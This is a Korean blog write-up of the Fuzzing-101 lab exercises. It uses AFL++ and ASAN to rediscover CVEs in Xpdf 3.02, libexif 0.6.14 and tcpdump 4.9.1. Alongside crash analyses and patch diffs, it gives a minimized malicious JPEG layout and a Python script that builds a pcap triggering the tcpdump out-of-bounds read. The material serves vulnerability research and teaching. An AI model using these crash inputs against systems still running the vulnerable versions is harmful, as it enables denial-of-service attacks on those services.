---
layout: post
title: "[Fuzzing-101] AFL++ 실습 상세 Write-up — Xpdf, libexif, tcpdump CVE 분석"
date: 2026-05-15
category: CTF/Wargame
author: yejunkim2000
tags: [Fuzzing, AFL++, ASAN, CVE, Xpdf, libexif, tcpdump, 취약점분석]
---

> **환경:** Docker (Ubuntu 22.04) · AFL++ 4.41a · afl-clang-fast · AFL_USE_ASAN=1

---

## 최종 결과

| # | 대상 | CVE | 크래시 | 결과 |
|:---:|:---|:---|:---:|:---:|
| EX1 | Xpdf 3.02 | CVE-2019-13288 | **16개** | 성공 |
| EX2 | libexif 0.6.14 | CVE-2012-2836 | **32개** | 성공 |
| EX3 | tcpdump 4.9.1 | CVE-2017-13028 | **1개+** | 성공 |

---

## Exercise 1 — Xpdf 3.02 (CVE-2019-13288)

### 취약점

`pdftotext`가 PDF를 파싱할 때 `Parser::getObj()`가 **재귀 깊이 제한 없이** 자기 자신을 호출할 수 있는 결함이다. 공격자가 `/DecodeParms` 딕셔너리에 순환 참조를 심어두면 스택이 고갈될 때까지 재귀가 반복된다.

---

### 퍼징

처음에는 ASAN 없이 시작했다가 완전히 실패했다. 두 번째 시도에서 ASAN과 JBIG2 시드를 추가하자 15분 만에 16개 크래시가 나왔다.

| 구분 | 1차 (ASAN 없음) | 2차 (ASAN 있음) |
|:---|:---|:---|
| 실행 시간 | 5시간 | **15분** |
| 실행 횟수 | 688,376 | 151,391 |
| 속도 | 37.95 exec/s | 226~444 exec/s |
| 크래시 | **0개** | **16개** |
| hang | 22개 | 26개 |
| 시드 | minimal.pdf | minimal.pdf + **jbig2_globals.pdf** |

**왜 이런 차이가 났는가?**

ASAN이 없으면 무한재귀는 AFL timeout(20초)을 초과하다 `SIGKILL`로 종료된다. AFL은 이것을 **hang**으로 분류한다. ASAN을 붙이면 스택 소진 즉시 `abort()` → `SIGABRT` → AFL이 **sig:06으로 크래시를 감지**한다.

```
ASAN 없음: 무한재귀 → timeout(20s) → SIGKILL  →  hang  (크래시 아님)
ASAN 있음: 무한재귀 → 스택 소진 → SIGABRT    →  crash
```

> **37배 차이** — ASAN 유무 하나가 5시간 삽질과 15분 성공의 차이를 만든다.

```bash
AFL_AUTORESUME=1 AFL_SKIP_CPUFREQ=1 \
afl-fuzz -i /fuzzing/seeds/pdf \
         -o /fuzzing/output/xpdf2 \
         -t 3000 \
         -- /fuzzing/xpdf-asan/bin/pdftotext @@ /dev/null
```

---

### 크래시 분석

총 16개 크래시 중 두 가지 유형으로 나뉜다.

| 시그널 | 개수 | 유형 |
|:---|:---:|:---|
| sig:11 (SIGSEGV) | 3개 | Stack Overflow — Parser::getObj() 무한재귀 |
| sig:06 (SIGABRT) | 13개 | JBIG2 메모리 손상 |

**크래시 1 — Stack Overflow (CVE-2019-13288)**

```
AddressSanitizer: stack-overflow on address 0x7ffd43e47de8
    #4  Parser::makeStream(...)    xpdf/Parser.cc:187
    #5  Parser::getObj(...)        xpdf/Parser.cc:94    ← 재귀 진입
    #6  XRef::fetch(...)           xpdf/XRef.cc:823
    #7  Object::fetch(...)         xpdf/Object.cc:106
    #8  Dict::lookup(...)          xpdf/Dict.cc:76
    #10 Stream::makeFilter(...)    xpdf/Stream.cc:264
    #11 Stream::addFilters(...)    xpdf/Stream.cc:110
    #12 Parser::makeStream(...)    xpdf/Parser.cc:203
    #13 Parser::getObj(...)        xpdf/Parser.cc:94    ← 재귀 반복
```

무한 재귀 경로:

```
Parser::getObj()
  └─ Parser::makeStream()
       └─ Stream::addFilters()
            └─ Stream::makeFilter()
                 └─ Dict::lookup()
                      └─ Object::fetch()
                           └─ XRef::fetch()
                                └─ Parser::getObj()  ← 다시 재귀!
```

`/DecodeParms` 딕셔너리가 또 다른 간접 참조를 포함하면, 필터 파라미터를 가져오는 과정에서 `Parser::getObj()`가 끝없이 자신을 호출한다. 깊이 제한 코드가 없는 것이 근본 원인이다.

**크래시 2 — JBIG2 메모리 손상 (SIGABRT)**

```
AddressSanitizer: unknown-crash on address 0x298f38fd942e84c
    #0  __asan_memset
    #1  JBIG2Bitmap::clearToZero()         JBIG2Stream.cc:747
    #2  JBIG2Stream::readPageInfoSeg(...)  JBIG2Stream.cc:3147
    #3  JBIG2Stream::readSegments()        JBIG2Stream.cc:1352
    #4  JBIG2Stream::reset()               JBIG2Stream.cc:1179
```

```c
// JBIG2Stream.cc:3147
width  = readULong();  // 공격자 제어: 0xFFFFFFFF 등 극단값 가능
height = readULong();  // 공격자 제어
bitmap = new JBIG2Bitmap(0, width, height);  // 거대 비트맵 할당
bitmap->clearToZero();   // memset → 잘못된 주소에 쓰기
```

JBIG2 Page Info Segment의 width/height에 범위 검증이 없어서, 극단값을 넣으면 엉뚱한 주소에 memset이 발생한다.

---

## Exercise 2 — libexif 0.6.14 (CVE-2012-2836)

### 취약점

JPEG EXIF 파싱 중 IFD 엔트리의 데이터 오프셋(`doff`) 값을 **범위 검증 없이** 힙 버퍼 인덱스로 사용한다. 공격자가 오프셋 필드를 `0xFFFF` 같은 큰 값으로 조작하면 힙 경계 밖을 읽게 된다.

---

### 퍼징

```bash
afl-fuzz -i /fuzzing/seeds/jpeg \
         -o /fuzzing/output/libexif \
         -t 5000 \
         -- /fuzzing/libexif-install/bin/exif @@
```

약 2시간, **32개** 크래시. 유형은 세 가지다.

| 유형 | 위치 |
|:---|:---|
| Heap Buffer Overflow (CVE 핵심) | exif-utils.c:137 |
| Stack Overflow (무한재귀) | exif-loader.c:301 |
| NULL 포인터 역참조 | exif-data.c |

---

### 크래시 분석

**크래시 1 — Heap Buffer Overflow (CVE-2012-2836)**

```
AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 3 at 0x... thread T0
    #0  exif_get_slong         libexif/exif-utils.c:137
    #1  exif_get_long          libexif/exif-utils.c:156
    #2  exif_entry_fix         libexif/exif-entry.c
    #8  exif_data_load_data    libexif/exif-data.c:188   ← 취약점 발원
```

JPEG EXIF의 IFD 엔트리 구조 (12 bytes):

```
[Tag 2B] [Type 2B] [Count 4B] [Value/Offset 4B]
```

취약 코드:

```c
// exif-data.c
doff = exif_get_long(d + 8, data->priv->order);  // 공격자 제어

// 범위 검증 없음! doff가 버퍼 크기를 초과해도 통과
entry->data = exif_mem_alloc(..., s);
memcpy(entry->data, d + doff, s);   // OOB read
```

공격 시나리오:

```
정상:  [Offset=26]      → 유효 범위
악성:  [Offset=0xFFFF]  → memcpy(entry->data, d + 0xFFFF, 5) → OOB
```

패치 (libexif 0.6.21):

```c
if (doff + s > ds) {
    exif_log(..., "Offset (%u) out of range", doff);
    return;   // 범위 초과 시 조기 반환
}
```

**크래시 2 — Stack Overflow (무한재귀)**

```
AddressSanitizer: stack-overflow
    #0  exif_loader_write  libexif/exif-loader.c:301
    #1  exif_loader_write  libexif/exif-loader.c:301
    ... (200회 이상 반복)
```

JPEG 마커 파싱 상태 머신이 잘못된 길이 필드를 만나면 동일 오프셋을 반복 처리하며 자기 자신을 재귀 호출한다.

---

### PoC 최소화

```bash
afl-tmin -i output/libexif/default/crashes/id:000007,... \
         -o crash_min.jpg \
         -- /fuzzing/libexif-asan/bin/exif @@
# 결과: 82 bytes → 70 bytes (14.6% 감소)
```

최소 PoC 구조 (70 bytes):

```
FF D8                    ← JPEG SOI
FF E1 xx xx              ← APP1 마커 + 길이
45 78 69 66 00 00        ← "Exif\0\0"
49 49 2A 00 08 00 00 00  ← TIFF LE 헤더
01 00                    ← IFD 엔트리 수: 1
0E 01 02 00 05 00 00 00  ← Tag, Type, Count
FF FF 00 00              ← Offset=0xFFFF  ← 범위 초과
00 00 00 00              ← Next IFD = none
FF D9                    ← JPEG EOI
```

---

## Exercise 3 — tcpdump 4.9.1 (CVE-2017-13028)

### 취약점

`bootp_print()`가 BOOTP 구조체의 `bp_flags` 필드(offset 10-11)를 읽을 때 **`ND_TCHECK` 경계 검사를 누락**했다. pcap `snaplen`이 패킷 실제 크기와 같으면 libpcap이 딱 그 크기만큼 힙을 할당하고, `bp_flags` 읽기 시 버퍼를 1~2바이트 넘는다.

---

### 버전 이슈

처음에 tcpdump **4.9.2**로 시작했다. 10,444,871 execs, 5,178개 큐 수동 검사 → **0 crashes**.

CVE 설명을 다시 읽으니 **"tcpdump before 4.9.2"** — 4.9.2는 이미 패치 버전이었다. 4.9.1로 재빌드하자 수동 PoC가 즉시 성공했다.

> **교훈:** NVD의 Affected Versions를 빌드 전에 반드시 확인해야 한다. 4.9.2로 5시간 날린 것이 이 교훈의 대가다.

---

### 패치 diff (딱 한 줄)

```diff
--- tcpdump-4.9.1/print-bootp.c
+++ tcpdump-4.9.2/print-bootp.c
@@ -324,0 +325 @@
+       ND_TCHECK(bp->bp_flags);
```

이 한 줄이 없어서 CVE가 생겼다.

---

### 취약 코드 흐름

```c
// print-bootp.c:307
ND_TCHECK(bp->bp_secs);   // offset 8-9: 경계 검사 있음

// print-bootp.c:325
// ND_TCHECK(bp->bp_flags) 누락!
ND_PRINT((ndo, ", Flags [%s]",
    bittok2str(bootp_flag_values, "none",
        EXTRACT_16BITS(&bp->bp_flags))));   // offset 10-11: OOB read
```

---

### 수동 PoC

```python
import struct

def pcap_header(snaplen):
    return struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, snaplen, 1)

def pkt_record(data, orig_len=300):
    return struct.pack('<IIII', 0, 0, len(data), orig_len) + data

bootp = struct.pack('>BBBBIH', 2, 1, 6, 0, 0xdeadbeef, 0x1234)  # 10 bytes
eth   = b'\xff'*6 + b'\x00\x11\x22\x33\x44\x55' + b'\x08\x00'
udp   = struct.pack('>HHHH', 68, 67, 8+len(bootp), 0)
ip    = struct.pack('>BBHHHBBH4s4s',
        0x45, 0, 20+8+len(bootp), 0, 0, 64, 17, 0,
        b'\xc0\xa8\x01\x02', b'\xff\xff\xff\xff')
pkt   = eth + ip + udp + bootp  # 52 bytes

# snaplen=53: 53바이트 버퍼 할당 → bp_flags 읽기 시 1바이트 OOB
with open('cve_trigger.pcap', 'wb') as f:
    f.write(pcap_header(snaplen=53) + pkt_record(pkt))
```

---

### ASAN 크래시 출력

```
AddressSanitizer: heap-buffer-overflow on address 0x606000000055
READ of size 2 at 0x606000000055 thread T0
    #0  EXTRACT_16BITS   extract.h:144:20
    #1  bootp_print      print-bootp.c:325:2   ← CVE-2017-13028
    #2  ip_print_demux   print-ip.c:387:3
    #3  ip_print         print-ip.c:658:3

0x606000000055 is located 0 bytes to the right of 53-byte region
```

---

### AFL 퍼징

```bash
ASAN_OPTIONS='abort_on_error=1:halt_on_error=1:symbolize=0:detect_leaks=0' \
AFL_SKIP_CPUFREQ=1 \
afl-fuzz -i /fuzzing/seeds/pcap491 \
         -o /fuzzing/output/tcpdump491 \
         -t 5000 \
         -- /fuzzing/tcpdump491-install/sbin/tcpdump -vv -r @@
```

AFL calibration 단계에서 즉시 sig:06 (SIGABRT) — CVE-2017-13028 재현 완료.

---

## 핵심 학습 포인트

### ASAN 없이는 못 찾는 크래시가 있다

```
EX1 — ASAN 없음 (5시간):  0 crashes, 22 hangs
EX1 — ASAN 있음 (15분):  16 crashes  ← 37배 효율 차이
```

Stack overflow는 timeout으로 처리되고, OOB read는 valid mapping 내이면 SIGSEGV조차 없다. ASAN이 없으면 AFL이 그냥 지나친다.

---

### AFL_USE_ASAN=1은 make 시점에만

| 방법 | 결과 |
|:---|:---|
| `CFLAGS="-fsanitize=address" ./configure` | fork server 충돌 (signal 11) |
| `AFL_USE_ASAN=1 make` | 정상 동작 |

---

### ASAN + AFL 호환 옵션 세트

```bash
ASAN_OPTIONS='abort_on_error=1:halt_on_error=1:symbolize=0:detect_leaks=0'
```

`abort_on_error=1`이 없으면 ASAN이 `_exit(1)`로 종료해 AFL이 크래시로 인식하지 않는다.

---

### 시드 품질이 커버리지를 결정한다

```
EX1: minimal.pdf만                    → 5시간 → 0 crashes
EX1: minimal.pdf + jbig2_globals.pdf  → 15분  → 16 crashes

EX3: 일반 pcap만                      → 크래시 미감지
EX3: snaplen=53 경계 pcap 추가        → calibration 즉시 감지
```

CVE 분석 후 해당 파서를 자극하는 구조체를 시드에 넣는 것이 핵심이다.

---

### 표준 퍼징 워크플로우

```
① 빌드:    CC=afl-clang-fast ./configure  →  AFL_USE_ASAN=1 make
② 시드:    최소 유효 파일 + CVE 관련 특수 구조체
③ 퍼징:    ASAN_OPTIONS='abort_on_error=1:...' afl-fuzz ...
④ 재현:    ASAN_OPTIONS='print_stacktrace=1' <binary> <crash>
⑤ 분석:    스택 트레이스 → 소스 코드 → 취약 로직
⑥ 최소화:  afl-tmin -i crash -o min -- <binary> @@
```
